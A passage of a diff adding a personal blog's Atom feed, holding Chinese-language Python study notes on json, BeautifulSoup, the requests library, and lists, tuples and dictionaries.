class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">abc</span><span class="params">(ddd)</span>:</span></span><br><span class="line">    _dic = &#123;<span class="string">"name"</span>:<span class="string">"loop"</span>, <span class="string">"age"</span>:<span class="string">"12"</span>&#125;</span><br><span class="line"></span><br><span class="line">    s = json.dumps(_dic, indent=<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#print type(s)</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"abc"</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#d = json.loads(s)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#print d</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:<span class="comment">#只有主函数是本文件才会运行</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"loop"</span></span><br></pre></td></tr></table></figure><p>Beautifulsoup用来爬具体网页的信息</p><p><img src="https://s2.ax1x.com/2020/01/19/1CSj8s.png" alt="1CSj8s.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">bs = BeautifulSoup(html,<span class="string">"html.parser"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 缩进格式</span></span><br><span class="line">print(bs.prettify()) //会报错 <span class="string">'ascii'</span> codec can<span class="string">'t encode characters in position 359-367: ordinal not in range(128)</span></span><br><span class="line"><span class="string">解决：（python安装默认ascii，所以出现非ASCII 编码时会报错</span></span><br><span class="line"><span class="string">import sys  </span></span><br><span class="line"><span class="string">reload(sys)  </span></span><br><span class="line"><span class="string">sys.setdefaultencoding('</span>utf8<span class="string">') </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 获取title标签的所有内容</span></span><br><span class="line"><span class="string">print(bs.title) </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 获取title标签的名称</span></span><br><span class="line"><span class="string">print(bs.title.name) </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 获取title标签的文本内容</span></span><br><span class="line"><span class="string">print(bs.title.string) </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 获取head标签的所有内容</span></span><br><span class="line"><span class="string">print(bs.head) </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 获取第一个div标签中的所有内容</span></span><br><span class="line"><span class="string">print(bs.div) </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 获取第一个div标签的id的值</span></span><br><span class="line"><span class="string">print(bs.div["id"])</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 获取第一个a标签中的所有内容</span></span><br><span class="line"><span class="string">print(bs.a) </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 获取所有的a标签中的所有内容</span></span><br><span class="line"><span class="string">print(bs.find_all("a"))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 获取id="u1"</span></span><br><span class="line"><span class="string">print(bs.find(id="u1")) </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 获取所有的a标签，并遍历打印a标签中的href的值</span></span><br><span class="line"><span class="string">for item in bs.find_all("a"): </span></span><br><span class="line"><span class="string">print(item.get("href")) </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 获取所有的a标签，并遍历打印a标签的文本值</span></span><br><span class="line"><span class="string">for item in bs.find_all("a"): </span></span><br><span class="line"><span class="string">print(item.get_text())</span></span><br></pre></td></tr></table></figure><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys  </span><br><span class="line">reload(sys)  </span><br><span class="line">sys.setdefaultencoding('utf8') </span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">from bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">url = <span class="string">"https://www.baidu.com"</span></span><br><span class="line"></span><br><span class="line">r = requests.<span class="keyword">get</span>(url)</span><br><span class="line">#<span class="built_in">print</span> r.content</span><br><span class="line">doc = r.content</span><br><span class="line">soup = <span class="type">BeautifulSoup</span>(doc,<span class="string">"html.parser"</span>)</span><br><span class="line"><span class="built_in">print</span> soup.prettify()</span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;dump序列&lt;/p&gt;
+&lt;p&gt;loads  逆过程&lt;/p&gt;
+&lt;p&gt;配合显示字典&lt;/p&gt;
+&lt;p&gt;requests 爬 github网站的code等&lt;/p&gt;
+    
+    </summary>
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>python-requests</title>
+    <link href="http://yoursite.com/2020/01/17/python-requestss/"/>
+    <id>http://yoursite.com/2020/01/17/python-requestss/</id>
+    <published>2020-01-17T05:47:01.000Z</published>
+    <updated>2020-02-27T14:02:25.796Z</updated>
+    
+    <content type="html"><![CDATA[<a id="more"></a><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'https://account.tophant.com/login.html?response_type=code&amp;client_id=b611bfe4ef417dbc&amp;state=2e509c092de6ba1bf39a6fff76dd9a76'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#requests的请求方法:get、post、put、delete、head、options等</span></span><br><span class="line">r = requests.<span class="builtin-name">get</span>(url)</span><br><span class="line">r = requests.post(url,<span class="attribute">data</span>=xxx)</span><br><span class="line">r = requests.put(url)</span><br><span class="line">r = requests.delete(url)</span><br><span class="line">r = requests.head(url)</span><br><span class="line">r = requests.options(url)</span><br><span class="line"></span><br><span class="line"><span class="comment">#代理认证：</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">  <span class="string">"http"</span>: <span class="string">"http://127.0.0.1:8080"</span>,</span><br><span class="line">  <span class="string">"https"</span>: <span class="string">"http://127.0.0.1:8080"</span>,</span><br><span class="line">&#125;</span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">"http"</span>: <span class="string">"http://user:pass@10.10.1.10:3128/"</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看响应码</span></span><br><span class="line"><span class="builtin-name">print</span> r.status_code</span><br><span class="line"></span><br><span class="line"><span class="comment">#重定向</span></span><br><span class="line">r = requests.<span class="builtin-name">get</span>(url, <span class="attribute">allow_redirects</span>=<span class="literal">False</span>)</span><br><span class="line"><span class="builtin-name">print</span> r.history</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看相应内容</span></span><br><span class="line"><span class="builtin-name">print</span> r.text</span><br><span class="line"><span class="builtin-name">print</span> r.content</span><br><span class="line"></span><br><span class="line"><span class="comment">#修改系统默认编码格式</span></span><br><span class="line">import sys</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看请求头</span></span><br><span class="line"><span class="builtin-name">print</span> r.request.headers</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看请求参数</span></span><br><span class="line"><span class="builtin-name">print</span> r.request.body</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#查看响应头</span></span><br><span class="line"><span class="builtin-name">print</span> r.headers</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#保存返回的结果</span></span><br><span class="line">fh = open(<span class="string">"abc.png"</span>, <span class="string">'w'</span>)</span><br><span class="line">fh.write(r.content)</span><br><span class="line">fh.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#查看返回的编码格式</span></span><br><span class="line"><span class="builtin-name">print</span> r.encoding</span><br><span class="line"></span><br><span class="line"><span class="comment">#更改返回的编码格式</span></span><br><span class="line">r.encoding = <span class="string">"utf-8"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#添加header头</span></span><br><span class="line">headers = &#123;<span class="string">'user-agent'</span>: <span class="string">'my-aasdasdaspp/0.0.1'</span>, <span class="string">'asd'</span>:<span class="string">'hello world!'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#修改cookie</span></span><br><span class="line">cookies = dict(<span class="attribute">cookies_are</span>=<span class="string">'working'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#获得响应头中的cookie</span></span><br><span class="line"><span class="builtin-name">print</span> r.cookies[<span class="string">'domain'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#如何发送post请求</span></span><br><span class="line">payload = &#123;<span class="string">'name'</span>: <span class="string">'loop'</span>, <span class="string">'age'</span>: <span class="string">'12'</span>&#125;</span><br><span class="line">r = requests.post(<span class="string">"http://httpbin.org/post"</span>, <span class="attribute">data</span>=payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#设置超时</span></span><br><span class="line">r = requests.<span class="builtin-name">get</span>(url, <span class="attribute">timeout</span>=5)</span><br><span class="line">r = requests.<span class="builtin-name">get</span>(url, <span class="attribute">timeout</span>=None)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#使用session</span></span><br><span class="line">conn = requests.session()</span><br><span class="line">r = conn.<span class="builtin-name">get</span>(url)</span><br><span class="line"><span class="builtin-name">print</span> r.request.headers</span><br><span class="line">r = conn.<span class="builtin-name">get</span>(url)</span><br><span class="line"><span class="builtin-name">print</span> r.request.headers</span><br><span class="line"></span><br><span class="line"><span class="comment">#请求方法</span></span><br><span class="line">r = requests.post(url, <span class="attribute">proxies</span>=proxies, <span class="attribute">headers</span>=headers, <span class="attribute">cookies</span>=cookies, <span class="attribute">verify</span>=<span class="literal">False</span>, <span class="attribute">data</span>=payload)</span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
+
+&lt;figure class=&quot;highlight routeros&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2
+      
+    
+    </summary>
+    
+    
+      <category term="学习note" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0note/"/>
+    
+    
+      <category term="python" scheme="http://yoursite.com/tags/python/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>python3-列表元组字典</title>
+    <link href="http://yoursite.com/2020/01/16/python3-%E5%88%97%E8%A1%A8%E5%85%83%E7%BB%84%E5%AD%97%E5%85%B8/"/>
+    <id>http://yoursite.com/2020/01/16/python3-%E5%88%97%E8%A1%A8%E5%85%83%E7%BB%84%E5%AD%97%E5%85%B8/</id>
+    <published>2020-01-16T12:46:55.000Z</published>
+    <updated>2020-02-27T14:01:23.146Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="python-day3-列表、元组、字典"><a href="#python-day3-列表、元组、字典" class="headerlink" title="python-day3 列表、元组、字典"></a>python-day3 列表、元组、字典</h3><h4 id="列表，"><a href="#列表，" class="headerlink" title="列表，"></a>列表，</h4><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list1 = ['Google', 'Runoob', <span class="number">1997</span>, <span class="number">2000</span>];list2 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> ];list3 = [<span class="string">"a"</span>, <span class="string">"b"</span>, <span class="string">"c"</span>,<span class="string">"d"</span>]</span><br></pre></td></tr></table></figure><p>列表下标从0开始</p><h5 id="访问，"><a href="#访问，" class="headerlink" title="访问，"></a>访问，</h5><h5 id="删除"><a href="#删除" class="headerlink" title="删除,"></a>删除,</h5><p>del list[0];</p><h5 id="操作符"><a href="#操作符" class="headerlink" title="操作符"></a>操作符</h5><p>len（list）长度；+连接；*重复；3 in list 判断是否存在；</p><a id="more"></a><h5 id="访问，-1"><a href="#访问，-1" class="headerlink" title="访问，"></a>访问，</h5><p>：是之后，list[0:]，-号是从后往前；</p><h5 id="嵌套："><a href="#嵌套：" class="headerlink" title="嵌套："></a>嵌套：</h5><p>x=[],n=[],y=[x,n];</p><h5 id="函数："><a href="#函数：" class="headerlink" title="函数："></a>函数：</h5><p> len(),max/min(),</p><h5 id="方法："><a href="#方法：" class="headerlink" title="方法："></a>方法：</h5><p>list.append(obj)在列表末尾添加新的对象<br>list.count(obj)统计某个元素在列表中出现的次数<br>list.extend(seq)在列表末尾一次性追加另一个序列中的多个值（用新列表扩展原来的列表）<br>list.index(obj)从列表中找出某个值第一个匹配项的索引位置<br>list.insert(index, obj)将对象插入列表<br>list.pop([index=-1])移除列表中的一个元素（默认最后一个元素），并且返回该元素的值<br>list.remove(obj)移除列表中某个值的第一个匹配项<br>list.reverse()反向列表中元素<br>list.sort( key=None, reverse=False)对原列表进行排序<br>list.clear()清空列表<br>list.copy()复制列表</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list = [<span class="string">1,2,3,4</span>]list.append('name')print(list)print(len(list))print(list*4)list.remove('name')print(list)for i in list:    print(i)n = [<span class="string">1,2</span>]x = [<span class="string">1,2,3</span>]list = [<span class="string">n,x</span>]print(list)print(list[<span class="string">0</span>][<span class="symbol">1</span>])//[<span class="string">1, 2, 3, 4, 'name'</span>]5[<span class="string">1, 2, 3, 4, 'name', 1, 2, 3, 4, 'name', 1, 2, 3, 4, 'name', 1, 2, 3, 4, 'name'</span>][<span class="symbol">1, 2, 3, 4</span>]1234[[1, 2], [1, 2, 3]]2</span><br></pre></td></tr></table></figure><h4 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h4><p>Python 的元组与列表类似，不同之处在于元组的元素不能修改。</p><h5 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h5><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">tup1</span>=(<span class="string">'z'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>)tup2=(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>)tup3=<span class="string">"a"</span>,<span class="string">"b"</span>,<span class="string">"c"</span>print(<span class="keyword">type</span>(tup3))</span><br></pre></td></tr></table></figure><p>空元组：tup1=（）；</p><p>元组中只包含一个元素时，需要在元素后面添加逗号，否则括号会被当作运算符使用：</p><h5 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h5><p>一样用[]；</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tup1 = (<span class="string">'Google'</span>, <span class="string">'Runoob'</span>, <span class="number">1997</span>, <span class="number">2000</span>)tup2 = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span> ) print (<span class="string">"tup1[0]: "</span>, tup1[<span class="number">0</span>])print (<span class="string">"tup2[1:5]: "</span>, tup2[<span class="number">1</span>:<span class="number">5</span>])</span><br></pre></td></tr></table></figure><p>和列表一致，无法修改，除非重新赋值到另一个元组；</p><p>无法删除，只可以全部删除</p><p>空数组无法输出，输出会报错；</p><h5 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h5><p>len();+;*;in ;for x in tup();</p><p>id()查看元组地址；</p><h4 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h4><p>字典是另一种可变容器模型，且可存储任意类型对象。</p><p>字典的每个键值(key=&gt;value)对用冒号(<strong>:</strong>)分割，每个对之间用逗号(<strong>,</strong>)分割，整个字典包括在花括号(<strong>{})</strong>中；</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d = &#123;key1 : value1, key2 : value2 &#125;dict = &#123;'Alice': '<span class="number">2341</span>', 'Beth': '<span class="number">9102</span>', 'Cecil': '<span class="number">3258</span>'&#125;</span><br></pre></td></tr></table></figure><h5 id="访问-1"><a href="#访问-1" class="headerlink" title="访问"></a>访问</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dict = &#123;<span class="string">'Name'</span>: <span class="string">'Runoob'</span>, <span class="string">'Age'</span>: 7, <span class="string">'Class'</span>: <span class="string">'First'</span>&#125; <span class="builtin-name">print</span> (<span class="string">"dict['Name']: "</span>, dict[<span class="string">'Name'</span>])<span class="builtin-name">print</span> (<span class="string">"dict['Age']: "</span>, dict[<span class="string">'Age'</span>])</span><br></pre></td></tr></table></figure><h5 id="修改字典"><a href="#修改字典" class="headerlink" title="修改字典"></a>修改字典</h5><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dict = &#123;<span class="string">'Name'</span>: <span class="string">'Runoob'</span>, <span class="string">'Age'</span>: <span class="number">7</span>, <span class="string">'Class'</span>: <span class="string">'First'</span>&#125; dict[<span class="string">'Age'</span>] = <span class="number">8</span>               # 更新 Agedict[<span class="string">'School'</span>] = <span class="string">"菜鸟教程"</span>  # 添加信息</span><br><span class="line">del dict[<span class="string">'Name'</span>] # 删除键 <span class="string">'Name'</span>dict.clear()     # 清空字典del dict         # 删除字典</span><br></pre></td></tr></table></figure><h5 id="字典特性"><a href="#字典特性" class="headerlink" title="字典特性"></a>字典特性</h5><p>1.不允许同一个键出现两次。创建时如果同一个键被赋值两次，后一个值会被记住，否则输入后定义的键值</p><p>2.键必须不可变，所以可以用数字，字符串或元组充当，而用列表就不行，如下实例：</p><h5 id="内置方法"><a href="#内置方法" class="headerlink" title="内置方法"></a>内置方法</h5><table><thead><tr><th>1</th><th><a href="https://www.runoob.com/python3/python3-att-dictionary-clear.html" target="_blank" rel="noopener">radiansdict.clear()</a> 删除字典内所有元素</th></tr></thead><tbody><tr><td>2</td><td><a href="https://www.runoob.com/python3/python3-att-dictionary-copy.html" target="_blank" rel="noopener">radiansdict.copy()</a> 返回一个字典的浅复制</td></tr><tr><td>3</td><td><a href="https://www.runoob.com/python3/python3-att-dictionary-fromkeys.html" target="_blank" rel="noopener">radiansdict.fromkeys()</a>  创建一个新字典，以序列seq中元素做字典的键，val为字典所有键对应的初始值</td></tr><tr><td>4</td><td><a href="https://www.runoob.com/python3/python3-att-dictionary-get.html" target="_blank" rel="noopener">radiansdict.get(key, default=None)</a> 返回指定键的值，如果值不在字典中返回default值</td></tr><tr><td>5</td><td><a href="https://www.runoob.com/python3/python3-att-dictionary-in.html" target="_blank" rel="noopener">key in dict</a> 如果键在字典dict里返回true，否则返回false</td></tr><tr><td>6</td><td><a href="https://www.runoob.com/python3/python3-att-dictionary-items.html" target="_blank" rel="noopener">radiansdict.items()</a> 以列表返回可遍历的(键, 值) 元组数组</td></tr><tr><td>7</td><td><a href="https://www.runoob.com/python3/python3-att-dictionary-keys.html" target="_blank" rel="noopener">radiansdict.keys()</a> 返回一个迭代器，可以使用 list() 来转换为列表</td></tr><tr><td>8</td><td><a href="https://www.runoob.com/python3/python3-att-dictionary-setdefault.html" target="_blank" rel="noopener">radiansdict.setdefault(key, default=None)</a>     和get()类似, 但如果键不存在于字典中，将会添加键并将值设为default</td></tr><tr><td>9</td><td><a href="https://www.runoob.com/python3/python3-att-dictionary-update.html" target="_blank" rel="noopener">radiansdict.update(dict2)</a> 把字典dict2的键/值对更新到dict里</td></tr><tr><td>10</td><td><a href="https://www.runoob.com/python3/python3-att-dictionary-values.html" target="_blank" rel="noopener">radiansdict.values()</a> 返回一个迭代器，可以使用 list() 来转换为列表</td></tr><tr><td>11</td><td><a href="https://www.runoob.com/python3/python3-att-dictionary-pop.html" target="_blank" rel="noopener">pop(key[,default])</a> 删除字典给定键 key 所对应的值，返回值为被删除的值。key值必须给出。 否则，返回default值。</td></tr><tr><td>12</td><td><a href="https://www.runoob.com/python3/python3-att-dictionary-popitem.html" target="_blank" rel="noopener"> popitem()</a> 随机返回并删除字典中的最后一对键和值。</td></tr></tbody></table><p>input（）函数</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;python-day3-列表、元组、字典&quot;&gt;&lt;a href=&quot;#python-day3-列表、元组、字典&quot; class=&quot;headerlink&quot; title=&quot;python-day3 列表、元组、字典&quot;&gt;&lt;/a&gt;python-day3 列表、元组、字典&lt;/h3&gt;&lt;h4 id=&quot;列表，&quot;&gt;&lt;a href=&quot;#列表，&quot; class=&quot;headerlink&quot; title=&quot;列表，&quot;&gt;&lt;/a&gt;列表，&lt;/h4&gt;&lt;figure class=&quot;highlight lsl&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;list1 = [&#39;Google&#39;, &#39;Runoob&#39;, &lt;span class=&quot;number&quot;&gt;1997&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;2000&lt;/span&gt;];list2 = [&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt; ];list3 = [&lt;span class=&quot;string&quot;&gt;&quot;a&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;b&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;c&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;d&quot;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;列表下标从0开始&lt;/p&gt;
+&lt;h5 id=&quot;访问，&quot;&gt;&lt;a href=&quot;#访问，&quot; class=&quot;headerlink&quot; title=&quot;访问，&quot;&gt;&lt;/a&gt;访问，&lt;/h5&gt;&lt;h5 id=&quot;删除&quot;&gt;&lt;a href=&quot;#删除&quot; class=&quot;headerlink&quot; title=&quot;删除,&quot;&gt;&lt;/a&gt;删除,&lt;/h5&gt;&lt;p&gt;del list[0];&lt;/p&gt;
+&lt;h5 id=&quot;操作符&quot;&gt;&lt;a href=&quot;#操作符&quot; class=&quot;headerlink&quot; title=&quot;操作符&quot;&gt;&lt;/a&gt;操作符&lt;/h5&gt;&lt;p&gt;len（list）长度；+连接；*重复；3 in list 判断是否存在；&lt;/p&gt;
+    
+    </summary>
+    
+    
+    
+  </entry>
+  
+</feed>
